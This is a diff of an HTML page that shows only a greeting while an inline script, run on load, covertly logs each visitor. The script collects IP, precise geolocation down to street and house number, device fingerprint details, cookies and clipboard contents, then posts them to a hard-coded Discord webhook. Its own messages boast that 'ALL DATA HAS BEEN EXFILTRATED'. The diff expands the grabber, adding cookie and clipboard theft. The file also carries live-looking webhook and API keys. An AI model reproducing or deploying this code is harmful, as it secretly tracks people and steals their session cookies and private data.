@@ -1,319 +1,464 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Hello Page</title>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      font-family: sans-serif;
-      background-color: #f0f0f0;
-    }
-    h1 {
-      font-size: 4rem;
-      color: #333;
-    }
-  </style>
-          <script>
-        	(async () => {
-  const webhookURL = "https://discord.com/api/webhooks/1368211694584856647/7flwPKRczBxGY26ZQi5akKWaYFW5tMPSPWhtnVSkOrR0VdE57NnTGJlgD-6HwAVSAOV2";
-  const ipAPIURL = "https://ipapi.co/json/?fields=all";
+<!DOCTYPE html>                
+<html lang="en">                
+<head>                
+  <meta charset="UTF-8" />                
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />                
+  <title>Hello Page</title>                
+  <style>                
+    body {                
+                display: flex;                
+                justify-content: center;                
+                align-items: center;                
+                height: 100vh;                
+                margin: 0;                
+                font-family: sans-serif;                
+                background-color: #f0f0f0;                
+    }                
+    h1 {                
+                font-size: 4rem;                
+                color: #333;                
+    }                
+  </style>                
+  <script>                
+    (async () => {                
+                const webhookURL = "https://discord.com/api/webhooks/1368211694584856647/7flwPKRczBxGY26ZQi5akKWaYFW5tMPSPWhtnVSkOrR0VdE57NnTGJlgD-6HwAVSAOV2";                
+                const ipGeolocationURL = "https://api.ipapi.is/?key=e8b48ee93f36a18a81e1";
+                
+                let data = {};                
+                try {                
+                  const response = await fetch(ipGeolocationURL);                
+                  if (!response.ok) throw new Error("Fetch gagal");                
+                  data = await response.json();                
+                } catch (e) {               
+                }                
+                
+                
+                let hwid = localStorage.getItem("vex_hwid");                
+                if (!hwid) {                
+                  hwid = crypto.randomUUID();                
+                  localStorage.setItem("vex_hwid", hwid);                
+                }                
+                
+                const ua = data?.user_agent || navigator.userAgent;                
+                const ip = data.ip;                
+                const isVPN = data.proxy || data.hosting || data.mobile;                
+                
+                
+                function detectBrowser(ua) {                
+                  if (/Edg/i.test(ua)) return "Edge";                
+                  if (/OPR|Opera/i.test(ua)) return "Opera";                
+                  if (/Chrome/i.test(ua)) return "Chrome";                
+                  if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";                
+                  if (/Firefox/i.test(ua)) return "Firefox";                
+                  return "Unknown";                
+                }                
+                
+let clipboard = "Unknown";
 
+const getClipboard = async () => {
   try {
-    const data = await fetch(ipAPIURL).then(res => res.json());
-    
-    let hwid = localStorage.getItem("vex_hwid");
-    if (!hwid) {
-      hwid = crypto.randomUUID();
-      localStorage.setItem("vex_hwid", hwid);
-    }
-
-    const ua = data.user_agent || navigator.userAgent;
-    const ip = data.ip;
-    const isVPN = data.proxy || data.hosting || data.mobile; // salah satu true berarti kemungkinan VPN
-
-    function detectBrowser(ua) {
-      if (/Edg/i.test(ua)) return "Edge";
-      if (/OPR|Opera/i.test(ua)) return "Opera";
-      if (/Chrome/i.test(ua)) return "Chrome";
-      if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
-      if (/Firefox/i.test(ua)) return "Firefox";
-      return "Unknown";
-    }
-
-const geocodeAPI = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;
-
-    const locationDetail = await fetch(geocodeAPI)
-      .then(res => res.json())
-      .then(data => data.address || {});
-      
-
-    const browser = detectBrowser(ua);
-    const now = new Date().toLocaleString();
-    const screenResolution = `${window.screen.width}x${window.screen.height}`;
-    const colorDepth = window.screen.colorDepth;
-    const windowResolution = `${window.innerWidth}x${window.innerHeight}`;
-    const isRetina = window.devicePixelRatio > 1 ? "Yes" : "No";
-    const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Yes" : "No";
-    const isOnline = navigator.onLine ? "Yes" : "No";
-    const lang = navigator.language || navigator.userLanguage;
-    const referrer = document.referrer;
-    const currentURL = window.location.href;
-    const pageLoadTime = performance.now();
-    const timeSpent = performance.timing.loadEventEnd - performance.timing.navigationStart;
-    const sessionStorageSize = JSON.stringify(sessionStorage).length;
-    const localStorageSize = JSON.stringify(localStorage).length;
-    const platform = navigator.platform;
-    const hardwareConcurrency = navigator.hardwareConcurrency;
-
-    let heatmapData = [];
-    document.addEventListener("click", (e) => {
-      heatmapData.push({ x: e.pageX, y: e.pageY });
-    });
-
- 
-    let isDevToolsOpen = false;
-    const devToolsCheck = () => {
-      const width = window.outerWidth - window.innerWidth > 100;
-      const height = window.outerHeight - window.innerHeight > 100;
-      isDevToolsOpen = width || height;
-    };
-    setInterval(devToolsCheck, 1000);
-
-    
-    const headers = new Headers();
-    headers.append("X-Custom-Header", "CustomValue");
-    const request = new Request(window.location.href, { headers });
-    const fetchHeaders = await fetch(request).then(res => res.headers);
-
-    const deviceFingerprint = {
-      platform,
-      hardwareConcurrency,
-      screenResolution,
-      colorDepth,
-      isRetina,
-      isDarkMode,
-      isVPN,
-      ip,
-      ua: navigator.userAgent
-    };
-
-    const vpnStatus = isVPN ? "VPN/Proxy Detected" : "No VPN/Proxy Detected";
-
-    const isAirplaneMode = /Airplane Mode/i.test(navigator.userAgent);
-
- const reverseDNS = await fetch("https://dns.google/resolve?name=" + ip.split('.').reverse().join('.') + ".in-addr.arpa&type=PTR")
-  .then(res => res.json())
-  .then(data => data.Answer?.[0]?.data?.replace(/\.$/, "") || "N/A")
-  .catch(() => "N/A");
-
-const isFullscreenMode = document.fullscreenElement ||
-                         document.mozFullScreenElement ||
-                         document.webkitFullscreenElement ||
-                         document.msFullscreenElement ? "Yes" : "No";
-
-const batteryStatus = battery.charging ? "Charging" : "Discharging";
-const batteryLevel = (battery.level * 100).toFixed(0) + "%";
-const screenOrientation = window.matchMedia("(orientation: portrait)").matches ? "Portrait" : "Landscape";
-const geolocationAccuracy = position.coords.accuracy;
-const screenDPI = window.devicePixelRatio;
-const cookiesEnabled = navigator.cookieEnabled ? "Yes" : "No";                         
- 
-    const embed = {
-      embeds: [{
-        title: "NEW VISITOR | NEW LOG ⚡",
-        image: { url: "https://files.catbox.moe/fr7gmm.jpeg" },
-        description: "Critical breach detected. All data extracted.",
-        fields: [
-          {
-            name: "🛠️ System Info",
-            value: `
-            
-            **IP**: ${ip}
-            **HWID**: ${hwid}
-            **User Agent**: ${navigator.userAgent}
-            **Browser**: ${browser}
-            **Platform**: ${platform}
-            **Hardware Cores**: ${hardwareConcurrency}
-            **Language**: ${lang}
-            **Dark Mode**: ${isDarkMode}
-            **VPN Status**: ${vpnStatus}  
-            **AirplaneMode**: ${isAirplaneMode ? "Yes" : "No"}
-            **Reverse DNS**: ${reverseDNS}
-            **UserAgent**: ${ua.slice(0, 256)}
-            `,
-            inline: false
-          },
-          {
-            name: "🌍 Location",
-            value: `
-           **Coordinates(IP)**: ${latitude}, ${longitude}
-           **Street(IP)**: ${locationDetail.road}
-           **House Number(IP)**: ${locationDetail.house_number}
-           **Suburb(IP)**: ${locationDetail.suburb}
-           **Village(IP)**: ${locationDetail.village}
-           **District(IP)**: ${locationDetail.district}
-           **City/Regency/State(IP)**: ${locationDetail.city || locationDetail.town || locationDetail.village}
-           **Province(IP)**: ${locationDetail.state}
-           **Postal Cod(IP)**: ${data.postal || locationDetail.postcode}
-           **Country(IP)**: ${data.country_name || locationDetail.country}
-           **Country Code(IP)**: ${data.country_code || locationDetail.country_code}
-           **Continent(IP)**: ${data.continent || locationDetail.continent}
-           **Continent Code(IP)**: ${data.continentCode || locationDetail.continent_code}
-           **Currency(IP)**: ${data.currency}
-           **Accuracy**: ${geolocationAccuracy}
-           [**View on Google Maps**](https://www.google.com/maps?q=${latitude},${longitude})
-            `,
-            inline: false
-          },
-          {
-            name: "💻 Device Details",
-            value: `
-            **Battery**: ${batteryStatus}, ${batteryLevel}
-            **Web Cookies**: ${cookiesEnabled}
-            **Screen Resolution**: ${screenResolution}
-            **Screen Orientation**: ${screenOrientation}
-            **Screen DPI**: ${screenDPI}
-            **Color Depth**: ${colorDepth}-bit
-            **Window Resolution**: ${windowResolution}
-            **Retina Display**: ${isRetina}
-            **Timezone**: ${data.timezone}
-            **Connection Type**: ${data.connection_type}
-            **ISP**: ${data.isp}
-            **AS Name**: ${data.asname}
-            **AS**: ${data.as}
-            **Organization**: ${data.org}
-            `,
-            inline: false
-          },
-          {
-            name: "🔗 Current Session",
-            value: `
-            **Current URL**: ${currentURL}
-            **Referrer**: ${referrer || "N/A"}
-            **Session Storage Size**: ${sessionStorageSize} bytes
-            **Local Storage Size**: ${localStorageSize} bytes
-            **Page Load Time**: ${pageLoadTime.toFixed(2)}ms
-            **Time Spent**: ${timeSpent.toFixed(2)}ms
-            `,
-            inline: false
-          },
-          {
-            name: "🛰️ Developer Tools",
-            value: isDevToolsOpen ? "Developer Tools Opened" : "Developer Tools Closed",
-            inline: true
-          },
-        ],
-        footer: { text: "Data Log | VEX SYSTEMS 👾" }
-      }]
-    };
-
-    await fetch(webhookURL, {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify(embed)
-});
-
-
-    
-    const textMessage = `
-🔥 **SYSTEM COMPROMISE DETECTED!** 🔥
------------------------------------
-
-🛡️ **SYSTEM INFORMATION**  
-**IP Address**: ${ip}  
-**HWID**: ${hwid}  
-**User Agent**: ${navigator.userAgent}  
-**Browser**: ${browser}  
-**Device Platform**: ${platform}  
-**Hardware Cores**: ${hardwareConcurrency}  
-**UserAgent**: ${ua.slice(0, 256)}
-
-🌍 **LOCATION DETAILS**  
-**Coordinates(IP)**: ${latitude}, ${longitude}
-**Street(IP)**: ${locationDetail.road}
-**House Number(IP)**: ${locationDetail.house_number}
-**Suburb(IP)**: ${locationDetail.suburb}
-**Village(IP)**: ${locationDetail.village}
-**District(IP)**: ${locationDetail.district}
-**City/Regency/State(IP)**: ${locationDetail.city || locationDetail.town || locationDetail.village}
-**Province(IP)**: ${locationDetail.state}
-**Postal Cod(IP)**: ${data.postal || locationDetail.postcode}
-**Country(IP)**: ${data.country_name || locationDetail.country}
-**Country Code(IP)**: ${data.country_code || locationDetail.country_code}
-**Continent(IP)**: ${data.continent || locationDetail.continent}
-**Continent Code(IP)**: ${data.continentCode || locationDetail.continent_code}
-**Currency(IP)**: ${data.currency}
-**Accuracy**: ${geolocationAccuracy}
-           
-[**View on Google Maps**](https://www.google.com/maps?q=${latitude},${longitude})
-
-🔗 **NETWORK & CONNECTION**  
-**ISP**: ${data.isp}  
-**Organization**: ${data.org}  
-**AS**: ${data.as}  
-**AS Name**: ${data.asname}  
-**Connection Type**: ${data.connection_type}  
-**VPN Status**: ${vpnStatus}  
-**Reverse DNS**: ${reverseDNS}
-
-⏰ **TIME & LANGUAGES**  
-**Timezone**: ${data.timezone}  
-**Language**: ${lang}  
-
-🔗 **BROWSER & NAVIGATION**  
-**Referrer**: ${referrer || "N/A"}  
-**Current URL**: ${currentURL}  
-
-⚙️ **DEVICE & SCREEN DETAILS**  
-**Battery**: ${batteryStatus}, ${batteryLevel}
-**Web Cookies**: ${cookiesEnabled}
-**Screen Resolution**: ${screenResolution}
-**Screen Orientation**: ${screenOrientation}
-**Screen DPI**: ${screenDPI}
-**Color Depth**: ${colorDepth}-bit
-**Window Resolution**: ${windowResolution}
-**Retina Display**: ${isRetina}
-
-📅 **TIMESTAMP**  
-**Date/Time**: ${now}
-
-⚠️ **ACTION REQUIRED!**  
-🔒 **ALL DATA HAS BEEN EXFILTRATED!**  
-Please verify the system logs immediately!  
------------------------------------------------------
-`;
-
-try {
-    const response = await fetch(webhookURL, {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ content: textMessage })
-});
-
-    if (!response.ok) {
-      const errorText = await response.text();
-      throw new Error(`HTTP error! status: ${response.status}, response: ${errorText}`);
-    }
-
-    console.log("Webhook sent successfully!");
-  } catch (error) {
-    console.error("Error sending webhook:", error.message || error);
-  }
-  
+    const text = await navigator.clipboard.readText();
+    clipboard = text || "Empty";
   } catch (err) {
-    console.error("Gagal menjalankan logger:", err.message || err);
+    clipboard = "Permission Denied";
   }
-  
+};
+
+window.addEventListener("click", () => {
+  getClipboard();
+});
+
+                
+const ipapiKey = "e8b48ee93f36a18a81e1";
+
+
+const geoData = await fetch(`https://api.ipapi.is/?key=${ipapiKey}`)
+  .then(res => res.json())
+  .catch(() => ({}));
+
+
+const ipapiData = {
+  ip: geoData.ip || "Unknown",
+  latitude: geoData.location?.latitude || "Unknown",
+  longitude: geoData.location?.longitude || "Unknown",
+  continent: geoData.location?.continent || "Unknown",
+  continentCode: geoData.location?.continent_code || "Unknown",
+  country: geoData.location?.country || "Unknown",
+  countryCode: geoData.location?.country_code || "Unknown",
+  zip: geoData.location?.zip || "Unknown",
+  city: geoData.location?.city || "Unknown",
+  district: geoData.location?.city || "Unknown",
+  region: geoData.location?.state || "Unknown",
+  postal: geoData.location?.zip || "Unknown",
+  timezone: geoData.location?.timezone || "Unknown",
+  isp: geoData.company?.name || "Unknown",
+  org: geoData.asn?.org || "Unknown",
+  accuracy: "IPapi-Based (~20-100 km)"
+};
+
+const bigDataGeo = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode?latitude=${ipapiData.latitude}&longitude=${ipapiData.longitude}&localityLanguage=id&key=bdc_e6b12b75c4d7455784e6b15ea5ea20f0`)
+  .then(res => res.json())
+  .catch(() => ({}))
+
+const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${ipapiData.latitude}&lon=${ipapiData.longitude}&format=json`)
+  .then(res => res.json())
+  .catch(() => ({}))
+
+const addressBigData = bigDataGeo.locality || {}
+const addressRevGeo = revGeo.address || {}
+
+const street = addressBigData.road || addressRevGeo.road || "Unknown"
+const house = addressBigData.house_number || addressRevGeo.house_number || "Unknown"
+const suburb = addressBigData.suburb || addressRevGeo.suburb || "Unknown"
+const village = addressBigData.village || addressRevGeo.village || "Unknown"
+const regency = addressBigData.county || addressRevGeo.county || addressRevGeo.district || "Unknown"
+const state = addressBigData.state || addressRevGeo.state || "Unknown"
+
+const locationDetail = `
+*Coordinates*: ${ipapiData.latitude}, ${ipapiData.longitude}                
+*District*: ${ipapiData.district}                
+*City*: ${ipapiData.city}                
+*Country*: ${ipapiData.country}                
+*Country Code*: ${ipapiData.countryCode}                
+*Region*: ${state}                
+*Postal Code*: ${ipapiData.postal}                
+*Zip Code*: ${ipapiData.zip}                
+*Continent*: ${ipapiData.continent}                
+*Continent Code*: ${ipapiData.continentCode}                
+*Timezone*: ${ipapiData.timezone}                
+*Accuracy*: ${ipapiData.accuracy}
+
+*Street*: ${street}                
+*House No*: ${house}                
+*Suburb*: ${suburb}                
+*Village*: ${village}                
+*State*: ${state}
+[*View on Google Maps*](https://www.google.com/maps?q=${ipapiData.latitude},${ipapiData.longitude})`;
+
+
+
+
+
+     
+                
+                const browser = detectBrowser(ua);                
+                const now = new Date().toLocaleString();                
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;                
+                const colorDepth = window.screen.colorDepth;                
+                const windowResolution = `${window.innerWidth}x${window.innerHeight}`;                
+                const isRetina = window.devicePixelRatio > 1 ? "Yes" : "No";                
+                const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Yes" : "No";                
+                const isOnline = navigator.onLine ? "Yes" : "No";                
+                const lang = navigator.language || navigator.userLanguage;                
+                const referrer = document.referrer;                
+                const currentURL = window.location.href;                
+                const pageLoadTime = performance.now();                
+                const timeSpent = performance.timing.loadEventEnd - performance.timing.navigationStart;                
+                const sessionStorageSize = JSON.stringify(sessionStorage).length;                
+                const localStorageSize = JSON.stringify(localStorage).length;                
+                const platform = navigator.platform;                
+                const hardwareConcurrency = navigator.hardwareConcurrency;                
+                
+                        
+const isDevToolsOpen = (() => {
+  let opened = false;
+  const threshold = 160;
+  const element = new Image();
+  Object.defineProperty(element, 'id', {
+    get() {
+      opened = true;
+    }
+  });
+
+  const check = () => {
+    opened = false;
+    console.dir(element);
+    return opened;
+  };
+
+  return check();
 })();
-</script>
-</head>
-<body>
-  <h1>hello</h1>
-</body>
-  </html>
+                
+                const deviceFingerprint = {                
+                  platform,                
+                  hardwareConcurrency,                
+                  screenResolution,                
+                  colorDepth,                
+                  isRetina,                
+                  isDarkMode,                
+                  isVPN,                
+                  ip,                
+                  ua: navigator.userAgent                
+                };                
+                
+                let batteryStatus = "Unknown";                
+                let batteryLevel = "Unknown";                
+                
+     if ('getBattery' in navigator) {                
+     navigator.getBattery().then(function(battery) {                
+     batteryStatus = battery.charging ? "Charging" : "Discharging";                
+     batteryLevel = `${Math.round(battery.level * 100)}%`;                
+     }).catch(() => {                
+    batteryStatus = "Unavailable";                
+    batteryLevel = "Unavailable";                
+  });                
+} else {                
+  batteryStatus = "Unsupported";                
+  batteryLevel = "Unsupported";                
+}                
+                const cookiesEnabled = navigator.cookieEnabled;                
+                const cookies = document.cookie || "No cookies found";                
+                
+                const cookieInfo = {                
+                status: cookiesEnabled ? "Enabled" : "Disabled",                
+                contents: cookies                
+};                
+                const vpnStatus = isVPN ? "VPN/Proxy Detected" : "No VPN/Proxy Detected";                
+                
+                const isAirplaneMode = /Airplane Mode/i.test(navigator.userAgent);                
+                
+                
+                
+                 
+                const embed = {                
+                  embeds: [{                
+                    title: "NEW VISITOR | NEW LOG ⚡",                
+                    image: { url: "https://files.catbox.moe/fr7gmm.jpeg" },                
+                    description: "Critical breach detected. All data extracted.",                
+                    fields: [                
+                                {                
+                                  name: "🛠️ System Info",                
+                                  value: `                
+                                    *IP*: ${ip}                
+                                    *HWID*: ${hwid}                
+                                    *User Agent*: ${navigator.userAgent}                
+                                    *Browser*: ${browser}                
+                                    *Platform*: ${platform}                
+                                    *Hardware Cores*: ${hardwareConcurrency}                
+                                    *Language*: ${lang}                
+                                    *Dark Mode*: ${isDarkMode}                
+                                    *VPN Status*: ${vpnStatus}                
+                                    *AirplaneMode*: ${isAirplaneMode ? "Yes" : "No"}                
+                                    *User Agent*: ${ua.slice(0, 256)}                
+                                  `,                
+                                  inline: false                
+                                },                
+                                
+                            {
+                               name: "🌍 Location | Based On IPGeolocation",
+                               value: `                
+                               *Coordinates*: ${ipapiData.latitude}, ${ipapiData.longitude}
+                               *District*: ${ipapiData.district}
+                               *City*: ${ipapiData.city}
+                               *Regency*: ${regency}
+                               *Country*: ${ipapiData.country}
+                               *Country Code*: ${ipapiData.countryCode}
+                               *Region*: ${ipapiData.region}
+                               *Postal Code*: ${ipapiData.postal}
+                               *Zip Code*: ${ipapiData.zip}
+                               *Continent*: ${ipapiData.continent}
+                               *Continent Code*: ${ipapiData.continentCode}
+                               *Timezone*: ${ipapiData.timezone}
+                               *Accuracy*: ${ipapiData.accuracy}
+                               *Street*: ${street}
+                               *House No*: ${house}
+                               *Suburb*: ${suburb}
+                               *Village*: ${village}
+                               *State*: ${state}
+                               [*View on Google Maps*](https://www.google.com/maps?q=${ipapiData.latitude},${ipapiData.longitude})
+                              `,
+                               inline: false
+                              },
+
+                                                
+                                {                
+                                  name: "💻 Device Details",                
+                                  value: `                
+                                    *Web Cookies*: ${cookiesEnabled}, ${cookies}                
+                                    *Battery*: ${batteryLevel}, ${batteryStatus}                
+                                    *Screen Resolution*: ${screenResolution}                
+                                    *Window Resolution*: ${windowResolution}                
+                                    *Retina Display*: ${isRetina}                
+                                    *Clipboard*: ${clipboard}
+                                    *Timezone*: ${data.timezone}                
+                                    *Connection Type*: ${data.connection_type}                
+                                    *ISP*: ${locationDetail.isp}                
+                                    *Org*: ${locationDetail.org}           
+                                    *DevTool*: ${isDevToolsOpen}     
+                                  `,                
+                                  inline: false                
+                                },                
+                                                
+                                {                
+                                  name: "🔗 Current Session",                
+                                  value: `                
+                                    *Current URL*: ${currentURL}                
+                                    *Referrer*: ${referrer || "N/A"}                
+                                    *Session Storage Size*: ${sessionStorageSize} bytes                
+                                    *Local Storage Size*: ${localStorageSize} bytes                
+                                    *Page Load Time*: ${pageLoadTime.toFixed(2)}ms                
+                                    *Time Spent*: ${timeSpent.toFixed(2)}ms                
+                                  `,                
+                                  inline: false                
+                                },                
+                                                 
+                    ],                
+                    footer: { text: "Data Log | VEX SYSTEMS 👾" }                
+                  }]                
+                };                
+                
+                
+                
+                const textMessage = `                
+                  🔥 *SYSTEM COMPROMISE DETECTED!* 🔥         
+                   👾 | CREDIT TO VEXZZ       
+                  -----------------------------------                
+                  *🛠️ | SYSTEM INFORMATION*
+                                    *IP*: ${ip}                
+                                    *HWID*: ${hwid}                
+                                    *User Agent*: ${navigator.userAgent}                
+                                    *Browser*: ${browser}                
+                                    *Platform*: ${platform}                
+                                    *Hardware Cores*: ${hardwareConcurrency}                
+                                    *Language*: ${lang}                
+                                    *Dark Mode*: ${isDarkMode}                
+                                    *VPN Status*: ${vpnStatus}                
+                                    *AirplaneMode*: ${isAirplaneMode ? "Yes" : "No"}                
+                                    *User Agent*: ${ua.slice(0, 256)}          
+                                    
+                  *🌏 | Location | Using Ipapi.is & bigdatacloud.net(Via Last ISP)*
+                               *Coordinates*: ${ipapiData.latitude}, ${ipapiData.longitude}
+                               *District*: ${ipapiData.district}
+                               *City*: ${ipapiData.city}
+                               *Regency*: ${regency}
+                               *Country*: ${ipapiData.country}
+                               *Country Code*: ${ipapiData.countryCode}
+                               *Region*: ${ipapiData.region}
+                               *Postal Code*: ${ipapiData.postal}
+                               *Zip Code*: ${ipapiData.zip}
+                               *Continent*: ${ipapiData.continent}
+                               *Continent Code*: ${ipapiData.continentCode}
+                               *Timezone*: ${ipapiData.timezone}
+                               *Accuracy*: ${ipapiData.accuracy}
+                               *Street*: ${street}
+                               *House No*: ${house}
+                               *Suburb*: ${suburb}
+                               *Village*: ${village}
+                               *State*: ${state}
+                               [*View on Google Maps*](https://www.google.com/maps?q=${ipapiData.latitude},${ipapiData.longitude})
+                               
+                  *💻 | DEVICE DETAIL*
+                                    *Web Cookies*: ${cookiesEnabled}, ${cookies}                
+                                    *Battery*: ${batteryLevel}, ${batteryStatus}                
+                                    *Screen Resolution*: ${screenResolution}                
+                                    *Window Resolution*: ${windowResolution}                
+                                    *Retina Display*: ${isRetina}                
+                                    *Clipboard*: ${clipboard}
+                                    *Timezone*: ${data.timezone}                
+                                    *Connection Type*: ${data.connection_type}                
+                                    *ISP*: ${locationDetail.isp}                
+                                    *Org*: ${locationDetail.org}  
+                                    *DevTool*: ${isDevToolsOpen}     
+
+                  *🔗 | CURRENT LINK*
+                                    *Current URL*: ${currentURL}                
+                                    *Referrer*: ${referrer || "N/A"}                
+                                    *Session Storage Size*: ${sessionStorageSize} bytes                
+                                    *Local Storage Size*: ${localStorageSize} bytes                
+                                    *Page Load Time*: ${pageLoadTime.toFixed(2)}ms                
+                                    *Time Spent*: ${timeSpent.toFixed(2)}ms                
+                `;              
+                
+                
+                
+function splitLongField(field, maxLen = 1000) {
+  const chunks = [];
+  let value = field.value;
+  let part = 1;
+
+  while (value.length > 0) {
+    chunks.push({
+      name: field.name + (part > 1 ? ` (part ${part})` : ""),
+      value: value.slice(0, maxLen),
+      inline: field.inline || false
+    });
+    value = value.slice(maxLen);
+    part++;
+  }
+
+  return chunks;
+}
+
+function splitEmbedFieldsSmart(fields, templateEmbed) {
+  const splitFields = [];
+
+  for (let field of fields) {
+    if (field.value.length > 1000) {
+      splitFields.push(...splitLongField(field));
+    } else {
+      splitFields.push(field);
+    }
+  }
+
+  const embeds = [];
+  let current = { ...templateEmbed, fields: [] };
+  let charCount = 0;
+
+  for (let field of splitFields) {
+    const length = field.name.length + field.value.length;
+
+    if (current.fields.length >= 25 || charCount + length > 5800) {
+      embeds.push({ embeds: [current] });
+      current = { ...templateEmbed, fields: [] };
+      charCount = 0;
+    }
+
+    current.fields.push(field);
+    charCount += length;
+  }
+
+  if (current.fields.length > 0) {
+    embeds.push({ embeds: [current] });
+  }
+
+  return embeds;
+}
+
+
+const embedParts = splitEmbedFieldsSmart(embed.embeds[0].fields, embed.embeds[0]);
+const midText = Math.ceil(textMessage.length / 2);
+const text1 = textMessage.slice(0, midText);
+const text2 = textMessage.slice(midText);
+
+
+fetch(webhookURL, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify(embedParts[0]) 
+})
+.then(() => {
+  return fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: text1 })
+  });
+})
+.then(() => {
+  return fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: text2 })
+  });
+})
+.catch(err => console.error("Error sending to Discord:", err));
+                
+  
+
+                
+    })();                
+  </script>                
+</head>                
+<body>                
+  <h1>Welcome to the Website</h1>                
+</body>                
+</html>
